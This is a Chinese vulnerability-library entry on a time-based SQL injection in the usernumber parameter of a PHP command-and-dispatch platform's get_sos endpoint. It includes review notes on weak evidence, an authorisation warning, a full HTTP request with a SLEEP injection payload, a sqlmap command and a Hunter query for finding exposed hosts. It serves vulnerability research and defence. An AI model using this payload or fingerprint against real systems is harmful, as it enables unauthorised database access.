---
source: "wy876 漏洞文库"
title: "指挥调度平台PHP版（科立讯归属待核） get_sos items usernumber时间SQL 注入"
product: "指挥调度平台PHP版（科立讯归属待核）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知版本，MySQL sleep，签名/时间戳规则未知"
prerequisites: "请求带会话、authcode及sign"
side_effects: "延迟探测可能占用数据库连接或影响服务"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/rnocaiwi1rqd0dx5"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%9E%8D%E5%90%88%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E5%B9%B3%E5%8F%B0/%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E5%B9%B3%E5%8F%B0usernumber%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.body="
hunter: "web.body=\"app/structure/departments.php\""
id: "vw-8221948ed8e76eb8327d5152"
entity_id: "ve-8221948ed8e76eb8327d5152"
schema_version: "1"
---

# 指挥调度平台PHP版（科立讯归属待核） get_sos items usernumber时间SQL 注入

## 条目说明

- 对象与具体问题：指挥调度平台PHP版（科立讯归属待核）；get_sos items usernumber时间SQLi
- 版本、配置及部署条件：未知版本，MySQL sleep，签名/时间戳规则未知
- 认证与权限前提：请求带会话、authcode及sign
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 固定历史timestamp/sign可能过期或与参数绑定，需交代鉴权机制
- Content-Length74明显短于完整注入body；5秒延迟无基线/响应，sqlmap命令非成功证据
- SOS业务读取/触发语义不明，补安全边界与修复

## 操作风险

延迟探测可能占用数据库连接或影响服务。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
指挥调度管理平台是一个专业针对通信行业的管理平台。该产品旨在提供高效的指挥调度喝管理解决方案，以帮助通信运营商或相关机构实现更好的运营效率和服务质量。该平台提供强大的指挥调度功能，可以实时监控和管理通信网络设备、维护人员和工作任务等。用户可以通过该平台发送指令、调度人员、分配任务。指挥调度平台usernumber存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

## 二、影响版本
+ 指挥调度平台

## 三、资产测绘
+ hunter`web.body="app/structure/departments.php"`
+ 特征


## 四、漏洞复现
```http
POST /api/get_sos/items.php HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=4c1e6025b94bac25c4ec63e4affec7cd; authcode=3hqs
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded

sign=7a6f931dde8e8aafbbfa4d2bcab475e6&timestamp=1686020152221&usernumber=1' AND (SELECT 5464 FROM (SELECT(SLEEP(5)))FZxX) AND 'khLM'='khLM
```

> 请求长度说明：原资料 Content-Length 为 74；静态长度已移除，应由客户端根据最终请求体的字节数生成。


sqlmap

```plain
sqlmap -r 2.txt --batch -p usernumber
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rnocaiwi1rqd0dx5>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
